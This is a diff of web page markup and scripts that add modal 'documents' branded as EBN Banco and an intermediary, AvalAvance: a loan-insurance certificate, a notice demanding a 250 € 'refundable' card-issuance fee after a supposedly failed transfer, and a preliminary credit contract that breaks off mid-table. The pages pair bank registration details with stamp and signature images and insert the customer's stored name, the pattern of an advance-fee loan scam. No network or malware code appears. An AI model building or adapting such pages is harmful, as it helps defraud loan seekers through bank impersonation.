+      }
+      document.addEventListener('DOMContentLoaded', function() {
+        var modal = document.getElementById('notifPdfModal');
+        if (!modal) return;
+        modal.querySelectorAll('[data-notif-pdf-close]').forEach(function(el) {
+          el.addEventListener('click', closeNotifPdfModal);
+        });
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && modal.classList.contains('tourist-contract-modal--open')) closeNotifPdfModal();
+        });
+      });
+    </script>
+
+    <!-- ── Insurance certificate modal (opened from chat card) ── -->
+    <div class="tourist-contract-modal" id="seguroModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-seguro-close tabindex="-1"></div>
+      <section class="tourist-contract-modal__panel" role="dialog" aria-modal="true" aria-labelledby="seguroTitle">
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="seguroTitle">Certificado individual de adhesión</h2>
+          </div>
+        </header>
+        <div class="tourist-contract-modal__body" id="seguroBody" tabindex="0">
+          <article class="credit-contract" aria-label="Certificado individual de adhesión al seguro de protección de pagos">
+            <section class="credit-contract__page">
+              <header class="credit-contract__masthead">
+                <div class="credit-contract__caixa-brand" id="seg_brand" aria-label="EBN Banco">
+                  <img src="../assets/banks/newBank/logo2.png" alt="EBN Banco" id="seg_logo" class="credit-contract__caixa-logo">
+                </div>
+                <div class="credit-contract__goval" aria-label="GO VAL FINANCE SL">
+                  <img src="../assets/document-logo.svg" alt="AvalAvance" class="credit-contract__goval-logo">
+                </div>
+              </header>
+
+              <p class="credit-contract__mono">
+                <strong id="seg_bankName">EBN Banco</strong><br>
+                Sede social:<br>
+                Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                NIF (CIF): A28763043<br>
+                Código Banco de España: 0211<br>
+                SWIFT/BIC: PROAESMMXXX<br>
+                LEI: 95980020140005388333<br>
+                Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                Con la intermediación de: <strong>AvalAvance</strong>
+              </p>
+
+              <h3 class="credit-contract__doc-title">CERTIFICADO INDIVIDUAL DE ADHESIÓN</h3>
+              <p class="credit-contract__doc-subtitle">Seguro colectivo de protección de pagos</p>
+              <p class="credit-contract__mono">
+                <strong>Asunto:</strong> confirmación de adhesión al seguro de protección de pagos vinculado
+                al contrato de financiación.
+              </p>
+              <p class="credit-contract__mono">
+                Por medio del presente documento se confirma que <strong id="seg_clientName">Oscar Asenjo Núñez</strong>
+                se adhiere al seguro colectivo de protección de pagos asociado al contrato Nº ES-4738D9215.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">1. Datos identificativos</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <table class="credit-contract__table">
+                <tbody>
+                  <tr><td>Tomador del seguro:</td><td>EBN Seguro</td></tr>
+                  <tr><td>Intermediario documental:</td><td>AvalAvance S.L.</td></tr>
+                  <tr><td>Contrato de financiación:</td><td>Contrato Nº ES-4738D9215</td></tr>
+                  <tr><td>Persona asegurada:</td><td id="seg_clientNameTable">Oscar Asenjo Núñez</td></tr>
+                  <tr><td>Beneficiario preferente:</td><td><span id="seg_bankBeneficiary">EBN Banco</span>, dentro del límite de la deuda pendiente.</td></tr>
+                  <tr><td>Fecha de emisión:</td><td id="seg_issueDate">29/06/2026</td></tr>
+                </tbody>
+              </table>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">2. Finalidad del seguro</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La finalidad del seguro consiste en cubrir, dentro de los límites acordados, determinadas
+                situaciones que puedan afectar a la capacidad de la persona asegurada para cumplir sus
+                obligaciones de pago derivadas del contrato de financiación, incluyendo fallecimiento,
+                incapacidad permanente absoluta, incapacidad temporal, desempleo involuntario u hospitalización,
+                conforme a las garantías efectivamente contratadas.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">3. Condiciones económicas principales</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <table class="credit-contract__table">
+                <tbody>
+                  <tr><td>Prima del seguro:</td><td>100,00 €</td></tr>
+                  <tr><td>Forma de pago:</td><td>Prima única</td></tr>
+                  <tr><td>Duración de la cobertura:</td><td>60 meses (5 años)</td></tr>
+                  <tr><td>Capital asegurado:</td><td>Saldo pendiente del préstamo hasta 5.000,00 €</td></tr>
+                  <tr><td>Beneficiario preferente:</td><td id="seg_bankBeneficiary2">EBN Banco</td></tr>
+                </tbody>
+              </table>
+              <footer class="credit-contract__page-footer">1</footer>
+            </section>
+
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">4. Resumen orientativo de garantías</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                <strong>Fallecimiento.</strong><br>
+                Cancelación del saldo pendiente del contrato asegurado conforme a las condiciones de la póliza.
+                Límite: hasta 5.000,00 €, por el importe de la deuda pendiente en la fecha del siniestro.
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Incapacidad permanente absoluta.</strong><br>
+                Cobertura de la deuda pendiente si la persona asegurada queda permanentemente incapacitada
+                para ejercer cualquier profesión u oficio. Límite: hasta 5.000,00 €, por el saldo pendiente
+                en la fecha del siniestro.
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Incapacidad temporal.</strong><br>
+                Pago de las cuotas mensuales del crédito durante el periodo de incapacidad temporal, una vez
+                finalizado el periodo de carencia. Límite: hasta 12 cuotas mensuales (1.212,60 €).
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Desempleo involuntario.</strong><br>
+                Pago de las cuotas mensuales del crédito en caso de pérdida involuntaria del empleo.
+                Límite: hasta 12 cuotas mensuales (1.212,60 €).
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Hospitalización.</strong><br>
+                Pago de las cuotas mensuales durante el periodo de hospitalización cuando no proceda la
+                cobertura por incapacidad temporal o desempleo. Límite: hasta 6 cuotas mensuales (606,30 €).
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">5. Comunicación del siniestro</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                En caso de producirse un evento previsto por la presente cobertura, la persona asegurada o
+                su representante legal deberán comunicarlo al asegurador en el plazo más breve posible desde
+                que tengan conocimiento del siniestro.
+              </p>
+              <p class="credit-contract__mono">
+                Para la tramitación de la solicitud podrán requerirse documentos acreditativos del siniestro,
+                incluidos informes médicos, documentos relativos a la situación laboral, información sobre la
+                hospitalización y cualquier otra documentación necesaria para valorar las circunstancias del evento.
+              </p>
+              <p class="credit-contract__mono">
+                El asegurador podrá solicitar información adicional cuando la documentación aportada no resulte
+                suficiente para adoptar una decisión.
+              </p>
+              <footer class="credit-contract__page-footer">2</footer>
+            </section>
+
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">6. Plazo de resolución de la solicitud</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Una vez recibido el conjunto completo de documentos, la solicitud será examinada por el
+                asegurador dentro de los plazos previstos por la legislación vigente y por las condiciones
+                del contrato de seguro.
+              </p>
+              <p class="credit-contract__mono">
+                Si el evento es reconocido como siniestro cubierto, el pago se efectuará al beneficiario o
+                se aplicará al cumplimiento de las obligaciones del contrato de financiación, dentro del
+                límite del capital asegurado.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">7. Exclusiones principales</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La cobertura no se extiende, con carácter general, a eventos derivados de actos intencionados
+                de la persona asegurada, declaraciones deliberadamente falsas al contratar, intoxicación por
+                alcohol o sustancias estupefacientes, participación en actividades ilícitas u otros supuestos
+                expresamente indicados en las condiciones generales del seguro.
+              </p>
+              <p class="credit-contract__mono">
+                No serán indemnizables los eventos ocurridos antes de la fecha de entrada en vigor de la cobertura.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">8. Derechos y obligaciones de las partes</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La persona asegurada se obliga a comunicar oportunamente al asegurador las circunstancias
+                relevantes para la valoración del riesgo, así como a facilitar información y documentos
+                veraces cuando le sean requeridos.
+              </p>
+              <p class="credit-contract__mono">
+                El asegurador se obliga a examinar la declaración de siniestro, resolver sobre el fondo de
+                la solicitud y cumplir sus obligaciones dentro de los límites de la cobertura contratada.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">9. Vigencia de la cobertura</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La cobertura entrará en vigor en la fecha indicada en las condiciones individuales del seguro,
+                siempre que se haya abonado la prima correspondiente. La cobertura finalizará al vencimiento
+                del periodo asegurado, por cumplimiento íntegro de las obligaciones del contrato de financiación,
+                por cancelación anticipada del seguro o en los demás casos previstos contractualmente.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">10. Firmas</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Lugar y fecha: Firma electrónica, <span id="seg_fecha">29/06/2026</span>
+              </p>
+              <div class="credit-contract__sign-cols">
+                <div class="credit-contract__sign-col" id="seg_signBank">Representante del banco EBN Banco</div>
+                <div class="credit-contract__sign-col">Representante del intermediario AvalAvance S.L.:</div>
+                <div class="credit-contract__sign-col">Cliente: <span id="seg_signClientName">Oscar Asenjo Núñez</span></div>
+              </div>
+              <div class="credit-contract__stamp-area" aria-hidden="true">
+                <img src="../assets/banks/newBank/stamp.svg" alt="" class="credit-contract__stamp" id="seg_stamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-contract__signature credit-contract__signature--left">
+                <img src="../assets/right-hand.png" alt="" class="credit-contract__signature credit-contract__signature--right">
+              </div>
+              <footer class="credit-contract__page-footer">3</footer>
+            </section>
+          </article>
+        </div>
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" data-seguro-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14 14.6641H2C1.72667 14.6641 1.5 14.4374 1.5 14.1641C1.5 13.8907 1.72667 13.6641 2 13.6641H14C14.2733 13.6641 14.5 13.8907 14.5 14.1641C14.5 14.4374 14.2733 14.6641 14 14.6641Z" fill="white"/><path d="M12.6843 2.31848C11.3909 1.02514 10.1243 0.991811 8.79761 2.31848L7.99095 3.12514C7.92428 3.19181 7.89761 3.29848 7.92428 3.39181C8.43095 5.15848 9.84428 6.57181 11.6109 7.07848C11.6376 7.08514 11.6643 7.09181 11.6909 7.09181C11.7643 7.09181 11.8309 7.06514 11.8843 7.01181L12.6843 6.20514C13.3443 5.55181 13.6643 4.91848 13.6643 4.27848C13.6709 3.61848 13.3509 2.97848 12.6843 2.31848Z" fill="white"/><path d="M10.4056 7.68849C10.2122 7.59516 10.0256 7.50182 9.84558 7.39516C9.69891 7.30849 9.55891 7.21516 9.41891 7.11516C9.30558 7.04182 9.17224 6.93516 9.04558 6.82849C9.03224 6.82182 8.98558 6.78182 8.93224 6.72849C8.71224 6.54182 8.46558 6.30182 8.24558 6.03516C8.22558 6.02182 8.19224 5.97516 8.14558 5.91516C8.07891 5.83516 7.96558 5.70182 7.86558 5.54849C7.78558 5.44849 7.69224 5.30182 7.60558 5.15516C7.49891 4.97516 7.40558 4.79516 7.31224 4.60849C7.16859 4.28365 6.89224 4.22182 6.72846 4.38561L2.89224 8.22182C2.80558 8.30849 2.72558 8.47516 2.70558 8.58849L2.34558 11.1418C2.27891 11.5952 2.40558 12.0218 2.68558 12.3085C2.92558 12.5418 3.25891 12.6685 3.61891 12.6685C3.69891 12.6685 3.77891 12.6618 3.85891 12.6485L6.41891 12.2885C6.53891 12.2685 6.70558 12.1885 6.78558 12.1018L10.6172 8.27015C10.7822 8.10523 10.7199 7.82237 10.5052 7.73124C10.4725 7.71734 10.4393 7.70311 10.4056 7.68849Z" fill="white"/></svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <script>
+      function openSeguroModal() {
+        var modal = document.getElementById('seguroModal');
+        if (!modal) return;
+        var bankName = '';
+        var bankKey = '';
+        var clientName = '';
+        try {
+          bankName = getStoredBankName('EBN Banco');
+          bankKey = 'newBank';
+          clientName = localStorage.getItem('touristCardNombre') || localStorage.getItem('inputName') || 'Oscar Asenjo Núñez';
+        } catch(e) {}
+        var bankDisplay = getStoredBankDisplay('EBN Banco');
+        var bankShort = getStoredBankShort('EBN Banco');
+        var bankUpper = bankDisplay;
+        var now = new Date();
+        var fecha = String(now.getDate()).padStart(2,'0') + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + now.getFullYear();
+        var setText = function(id, value) {
+          var el = document.getElementById(id);
+          if (el) el.textContent = value;
+        };
+        setText('seg_bankName', bankUpper);
+        setText('seg_bankNameFrom', bankDisplay);
+        setText('seg_clientName', clientName);
+        setText('seg_clientNameTable', clientName);
+        setText('seg_bankBeneficiary', bankShort);
+        setText('seg_bankBeneficiary2', bankShort);
+        setText('seg_issueDate', fecha);
+        setText('seg_fecha', fecha);
+        setText('seg_signBank', 'Representante del banco ' + bankDisplay);
+        setText('seg_signClientName', clientName);
+        var logoEl = document.getElementById('seg_logo');
+        if (logoEl) { logoEl.src = '../assets/banks/newBank/logo2.png'; logoEl.alt = bankName; }
+        var stampEl = document.getElementById('seg_stamp');
+        if (stampEl) stampEl.src = '../assets/banks/newBank/stamp.svg';
+        var brand = document.getElementById('seg_brand');
+        if (brand) brand.setAttribute('aria-label', bankName);
+        modal.classList.add('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('contract-modal-open');
+        var body = document.getElementById('seguroBody');
+        if (body) { body.scrollTop = 0; setTimeout(function(){ body.focus({ preventScroll: true }); }, 0); }
+      }
+      function closeSeguroModal() {
+        var modal = document.getElementById('seguroModal');
+        if (!modal) return;
+        modal.classList.remove('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('contract-modal-open');
+      }
+      document.addEventListener('DOMContentLoaded', function() {
+        var modal = document.getElementById('seguroModal');
+        if (!modal) return;
+        modal.querySelectorAll('[data-seguro-close]').forEach(function(el) {
+          el.addEventListener('click', closeSeguroModal);
+        });
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && modal.classList.contains('tourist-contract-modal--open')) closeSeguroModal();
+        });
+      });
+    </script>
+
+    <!-- ── Credit card account modal (opened from chat card) ── -->
+    <div class="tourist-contract-modal" id="creditCardContractModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-creditc-close tabindex="-1"></div>
+      <section class="tourist-contract-modal__panel" role="dialog" aria-modal="true" aria-labelledby="creditCardContractTitle">
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="creditCardContractTitle">Documento de EBN Banco</h2>
+          </div>
+        </header>
+        <div class="tourist-contract-modal__body" id="creditCardContractBody" tabindex="0">
+          <article class="credit-contract" aria-label="Comunicación sobre apertura de cuenta de crédito y emisión de tarjeta">
+            <section class="credit-contract__page">
+              <header class="credit-contract__masthead">
+                <div class="credit-contract__caixa-brand" id="ccm_brand" aria-label="EBN Banco">
+                  <img src="../assets/banks/newBank/logo2.png" alt="EBN Banco" id="ccm_logo" class="credit-contract__caixa-logo">
+                </div>
+                <div class="credit-contract__goval" aria-label="GO VAL FINANCE SL">
+                  <img src="../assets/document-logo.svg" alt="AvalAvance" class="credit-contract__goval-logo">
+                </div>
+              </header>
+
+              <p class="credit-contract__mono">
+                <strong id="ccm_bankName">EBN Banco</strong><br>
+                Sede social:<br>
+                Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                NIF (CIF): A28763043<br>
+                Código Banco de España: 0211<br>
+                SWIFT/BIC: PROAESMMXXX<br>
+                LEI: 95980020140005388333<br>
+                Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                Con la intermediación de: <strong>AvalAvance</strong>
+              </p>
+
+              <p class="credit-contract__mono">
+                <strong>De:</strong> <strong id="ccm_bankNameFrom">EBN Banco</strong><br>
+                <strong>A:</strong> <strong>AvalAvance S.L.</strong>
+              </p>
+
+              <h3 class="credit-contract__doc-title">VINCULACIÓN DE CUENTA DE CRÉDITO Y EMISIÓN DE TARJETA DE CRÉDITO</h3>
+              <p class="credit-contract__doc-subtitle">Información importante para <strong id="ccm_clientName">Oscar Asenjo Núñez</strong></p>
+
+              <p class="credit-contract__mono">
+                Durante el intento de transferencia de los fondos de crédito al IBAN indicado por usted,
+                el banco recibió en varias ocasiones un rechazo técnico de abono. Debido a la imposibilidad
+                de completar la transferencia a su cuenta bancaria, se ha decidido emitir a su nombre una
+                tarjeta de crédito vinculada a la cuenta de crédito abierta.
+              </p>
+
+              <p class="credit-contract__mono">
+                Una vez finalizada la emisión y activación de la tarjeta de crédito, podrá acceder a la
+                cuenta de crédito abierta y retirar los fondos en efectivo en cualquier cajero automático
+                compatible con operaciones mediante tarjeta bancaria.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">1. Coste del servicio</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                El coste del servicio de emisión y entrega de la tarjeta de crédito asciende a
+                <strong>250,00 €</strong>. Este pago es reembolsable: tras la emisión correcta de la tarjeta,
+                el importe abonado será devuelto automáticamente y en su totalidad a la cuenta del remitente
+                en el plazo de 1 hora.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">2. Servicios incluidos en la emisión de la tarjeta</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Vinculación de la cuenta de crédito existente al Contrato Nº ES-4738D9215.</li>
+                <li>Fabricación y entrega de la tarjeta de crédito.</li>
+                <li>Atención prioritaria por parte del servicio de soporte al cliente.</li>
+                <li>Retirada de efectivo sin intereses en cajeros automáticos.</li>
+                <li>Pago sin efectivo de bienes y servicios utilizando los fondos de crédito disponibles.</li>
+              </ul>
+              <footer class="credit-contract__page-footer">1</footer>
+            </section>
+
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">3. Responsabilidad del cliente</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>El cliente tiene derecho a recibir la tarjeta de crédito tras cumplir las condiciones de emisión previstas en el contrato.</li>
+                <li>El cliente tiene derecho a utilizar la tarjeta de crédito para retirar efectivo y pagar bienes o servicios dentro del límite de crédito disponible.</li>
+                <li>En caso de retraso del pago reembolsable superior a 5 días, se aplicará un recargo de 2 puntos porcentuales sobre el tipo de interés contractual.</li>
+                <li>Cada recordatorio enviado se abonará por separado: 10 € por notificación postal y 5 € por notificación electrónica.</li>
+                <li>El cliente deberá utilizar la tarjeta de crédito exclusivamente conforme a las condiciones del contrato de crédito y la legislación vigente.</li>
+                <li>El cliente deberá informar al banco sin demora en caso de pérdida, robo o compromiso de la tarjeta de crédito.</li>
+              </ul>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">4. Derechos y obligaciones de AvalAvance</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>AvalAvance se compromete a acompañar al cliente en todas las fases de emisión y activación de la tarjeta de crédito.</li>
+                <li>AvalAvance se compromete a informar oportunamente al cliente sobre el estado de tramitación de la solicitud, la emisión de la tarjeta y la activación de la cuenta de crédito.</li>
+                <li>AvalAvance se compromete a emitir la tarjeta de crédito y facilitar el acceso a la cuenta de crédito una vez cumplidas por el cliente las condiciones de emisión.</li>
+                <li>AvalAvance se compromete a habilitar la retirada de los fondos de crédito a través de cajeros automáticos tras la activación correcta de la tarjeta.</li>
+                <li>AvalAvance podrá suspender el servicio de la tarjeta si detecta indicios de fraude o incumplimiento contractual, hasta que finalice la verificación correspondiente.</li>
+                <li>AvalAvance se compromete a proteger los fondos y la confidencialidad de la información del cliente de acuerdo con sus normas internas de seguridad.</li>
+                <li>AvalAvance podrá enviar al cliente notificaciones relacionadas con el mantenimiento de la cuenta de crédito y el cumplimiento de las condiciones contractuales.</li>
+              </ul>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">5. Firmas</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <div class="credit-contract__sign-cols">
+                <div class="credit-contract__sign-col" id="ccm_signBank">Representante del banco EBN Banco</div>
+                <div class="credit-contract__sign-col">Representante del intermediario AvalAvance S.L.:</div>
+                <div class="credit-contract__sign-col">Cliente: <span id="ccm_signClientName">Oscar Asenjo Núñez</span></div>
+              </div>
+              <div class="credit-contract__stamp-area" aria-hidden="true">
+                <img src="../assets/banks/newBank/stamp.svg" alt="" class="credit-contract__stamp" id="ccm_stamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-contract__signature credit-contract__signature--left">
+                <img src="../assets/right-hand.png" alt="" class="credit-contract__signature credit-contract__signature--right">
+              </div>
+              <footer class="credit-contract__page-footer">2</footer>
+            </section>
+          </article>
+        </div>
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" data-creditc-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14 14.6641H2C1.72667 14.6641 1.5 14.4374 1.5 14.1641C1.5 13.8907 1.72667 13.6641 2 13.6641H14C14.2733 13.6641 14.5 13.8907 14.5 14.1641C14.5 14.4374 14.2733 14.6641 14 14.6641Z" fill="white"/><path d="M12.6843 2.31848C11.3909 1.02514 10.1243 0.991811 8.79761 2.31848L7.99095 3.12514C7.92428 3.19181 7.89761 3.29848 7.92428 3.39181C8.43095 5.15848 9.84428 6.57181 11.6109 7.07848C11.6376 7.08514 11.6643 7.09181 11.6909 7.09181C11.7643 7.09181 11.8309 7.06514 11.8843 7.01181L12.6843 6.20514C13.3443 5.55181 13.6643 4.91848 13.6643 4.27848C13.6709 3.61848 13.3509 2.97848 12.6843 2.31848Z" fill="white"/><path d="M10.4056 7.68849C10.2122 7.59516 10.0256 7.50182 9.84558 7.39516C9.69891 7.30849 9.55891 7.21516 9.41891 7.11516C9.30558 7.04182 9.17224 6.93516 9.04558 6.82849C9.03224 6.82182 8.98558 6.78182 8.93224 6.72849C8.71224 6.54182 8.46558 6.30182 8.24558 6.03516C8.22558 6.02182 8.19224 5.97516 8.14558 5.91516C8.07891 5.83516 7.96558 5.70182 7.86558 5.54849C7.78558 5.44849 7.69224 5.30182 7.60558 5.15516C7.49891 4.97516 7.40558 4.79516 7.31224 4.60849C7.16859 4.28365 6.89224 4.22182 6.72846 4.38561L2.89224 8.22182C2.80558 8.30849 2.72558 8.47516 2.70558 8.58849L2.34558 11.1418C2.27891 11.5952 2.40558 12.0218 2.68558 12.3085C2.92558 12.5418 3.25891 12.6685 3.61891 12.6685C3.69891 12.6685 3.77891 12.6618 3.85891 12.6485L6.41891 12.2885C6.53891 12.2685 6.70558 12.1885 6.78558 12.1018L10.6172 8.27015C10.7822 8.10523 10.7199 7.82237 10.5052 7.73124C10.4725 7.71734 10.4393 7.70311 10.4056 7.68849Z" fill="white"/></svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <script>
+      function openCreditCardContractModal() {
+        var modal = document.getElementById('creditCardContractModal');
+        if (!modal) return;
+        var bankName = '';
+        var bankKey  = '';
+        var clientName = '';
+        try {
+          bankName = getStoredBankName('EBN Banco');
+          bankKey  = 'newBank';
+          clientName = localStorage.getItem('touristCardNombre') || localStorage.getItem('inputName') || 'Oscar Asenjo Núñez';
+        } catch(e) {}
+        var bankDisplay = getStoredBankDisplay('EBN Banco');
+        var bankUpper = bankDisplay;
+        var bankEl = document.getElementById('ccm_bankName');
+        var bankFromEl = document.getElementById('ccm_bankNameFrom');
+        var signBank = document.getElementById('ccm_signBank');
+        var clientEl = document.getElementById('ccm_clientName');
+        var signClientEl = document.getElementById('ccm_signClientName');
+        if (bankEl) bankEl.textContent = bankUpper;
+        if (bankFromEl) bankFromEl.textContent = bankDisplay;
+        if (signBank) signBank.textContent = 'Representante del banco ' + bankDisplay;
+        if (clientEl) clientEl.textContent = clientName;
+        if (signClientEl) signClientEl.textContent = clientName;
+        var logoEl = document.getElementById('ccm_logo');
+        if (logoEl) { logoEl.src = '../assets/banks/newBank/logo2.png'; logoEl.alt = bankName; }
+        var stampEl = document.getElementById('ccm_stamp');
+        if (stampEl) stampEl.src = '../assets/banks/newBank/stamp.svg';
+        var brand = document.getElementById('ccm_brand');
+        if (brand) brand.setAttribute('aria-label', bankName);
+        modal.classList.add('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('contract-modal-open');
+        var body = document.getElementById('creditCardContractBody');
+        if (body) { body.scrollTop = 0; setTimeout(function(){ body.focus({ preventScroll: true }); }, 0); }
+      }
+      function closeCreditCardContractModal() {
+        var modal = document.getElementById('creditCardContractModal');
+        if (!modal) return;
+        modal.classList.remove('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('contract-modal-open');
+      }
+      document.addEventListener('DOMContentLoaded', function() {
+        var modal = document.getElementById('creditCardContractModal');
+        if (!modal) return;
+        modal.querySelectorAll('[data-creditc-close]').forEach(function(el) {
+          el.addEventListener('click', closeCreditCardContractModal);
+        });
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && modal.classList.contains('tourist-contract-modal--open')) closeCreditCardContractModal();
+        });
+      });
+    </script>
+
+    <!-- ── Contrato modal (view-only, opened from chat card) ── -->
+    <div class="tourist-contract-modal" id="contratoViewModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-contrato-close tabindex="-1"></div>
+      <section class="tourist-contract-modal__panel" role="dialog" aria-modal="true" aria-labelledby="contratoViewTitle">
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="contratoViewTitle">Contrato de crédito</h2>
+          </div>
+        </header>
+        <div class="tourist-contract-modal__body" id="contratoViewBody" tabindex="0">
+          <article class="credit-contract" aria-label="Contrato preliminar de crédito">
+            <!-- PÁGINA 1 -->
+            <section class="credit-contract__page">
+              <header class="credit-contract__masthead">
+                <div class="credit-contract__caixa-brand" id="cvm_brand" aria-label="EBN Banco">
+                  <img src="../assets/banks/newBank/logo2.png" alt="EBN Banco" id="cvm_logo" class="credit-contract__caixa-logo">
+                </div>
+                <div class="credit-contract__goval" aria-label="GO VAL FINANCE SL">
+                  <img src="../assets/document-logo.svg" alt="AvalAvance" class="credit-contract__goval-logo">
+                </div>
+              </header>
+              <p class="credit-contract__mono">
+                <strong id="cvm_bankName">EBN Banco</strong><br>
+                Sede social:<br>
+                Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                NIF (CIF): A28763043<br>
+                Código Banco de España: 0211<br>
+                SWIFT/BIC: PROAESMMXXX<br>
+                LEI: 95980020140005388333<br>
+                Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                Con la intermediación de: <strong>AvalAvance</strong>
+              </p>
+              <h3 class="credit-contract__doc-title">CONTRATO PRELIMINAR DE CRÉDITO</h3>
+              <p class="credit-contract__doc-subtitle">(Aviso sobre las condiciones de crédito)</p>
+              <p class="credit-contract__mono">
+                La empresa <strong>AvalAvance S.L.</strong>, actuando como intermediario de crédito
+                (Agente en actividad financiera – OAM A130179), confirma la mediación de la operación.
+              </p>
+              <p class="credit-contract__mono">
+                El banco <span id="cvm_bankName2">EBN Banco</span> confirma la aprobación de la concesión del crédito.<br>
+                El presente contrato establece las condiciones de concesión del crédito y entra en
+                vigor desde el momento de su firma por las partes.
+              </p>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">1. Condiciones principales del crédito</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <table class="credit-contract__table">
+                <thead><tr><th>Parametro</th><th>Dettagli</th></tr></thead>
+                <tbody>
+                  <tr><td>Importe del crédito:</td><td>5 000.00</td></tr>
+                  <tr><td>Tasa Anual Nominal (TAN):</td><td>7.86%</td></tr>
